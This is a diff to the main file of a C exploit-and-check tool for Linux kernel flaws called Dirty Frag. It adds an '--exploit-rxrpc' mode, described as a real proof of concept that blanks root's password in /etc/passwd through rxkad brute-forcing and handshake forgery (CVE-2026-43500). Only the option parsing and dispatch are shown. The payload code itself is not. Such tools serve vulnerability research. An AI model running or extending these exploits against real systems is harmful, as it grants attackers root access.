@@ -53,6 +53,8 @@ static void usage(const char *prog)
 "  --check-rxrpc          Dirty Frag RxRPC   (CVE-2026-43500) detection only\n"
 "  --exploit-copyfail     real PoC: flip /etc/passwd UID via algif_aead\n"
 "  --exploit-esp          real PoC: flip /etc/passwd UID via xfrm-ESP\n"
+"  --exploit-rxrpc        real PoC: empty /etc/passwd root pwd via rxkad\n"
+"                         (fcrypt brute-force + AF_RXRPC handshake forgery)\n"
 "  --cleanup              evict /etc/passwd from page cache and drop_caches\n"
 "  --version              print version\n"
 "  --help                 this message\n"
@@ -79,6 +81,7 @@ enum mode {
     MODE_CHECK_RXRPC,
     MODE_EXPLOIT_COPYFAIL,
     MODE_EXPLOIT_ESP,
+    MODE_EXPLOIT_RXRPC,
     MODE_CLEANUP,
     MODE_HELP,
     MODE_VERSION,
@@ -98,6 +101,7 @@ int main(int argc, char **argv)
         {"check-rxrpc",      no_argument, NULL,  3 },
         {"exploit-copyfail", no_argument, NULL,  4 },
         {"exploit-esp",      no_argument, NULL,  5 },
+        {"exploit-rxrpc",    no_argument, NULL,  7 },
         {"cleanup",          no_argument, NULL,  6 },
         {"no-shell",         no_argument, NULL, 'n'},
         {"no-color",         no_argument, NULL, 'C'},
@@ -115,6 +119,7 @@ int main(int argc, char **argv)
             case  3 :  m = MODE_CHECK_RXRPC;      break;
             case  4 :  m = MODE_EXPLOIT_COPYFAIL; break;
             case  5 :  m = MODE_EXPLOIT_ESP;      break;
+            case  7 :  m = MODE_EXPLOIT_RXRPC;    break;
             case  6 :  m = MODE_CLEANUP;          break;
             case 'n':  do_shell = false;          break;
             case 'C':  dirtyfail_use_color = false; break;
@@ -178,6 +183,11 @@ int main(int argc, char **argv)
     case MODE_EXPLOIT_ESP:
         log_warn("running real PoC for Dirty Frag xfrm-ESP (CVE-2026-43284)");
         r = dirtyfrag_esp_exploit(do_shell);
+        break;
+
+    case MODE_EXPLOIT_RXRPC:
+        log_warn("running real PoC for Dirty Frag RxRPC (CVE-2026-43500)");
+        r = dirtyfrag_rxrpc_exploit(do_shell);
         break;
 
     case MODE_CLEANUP:
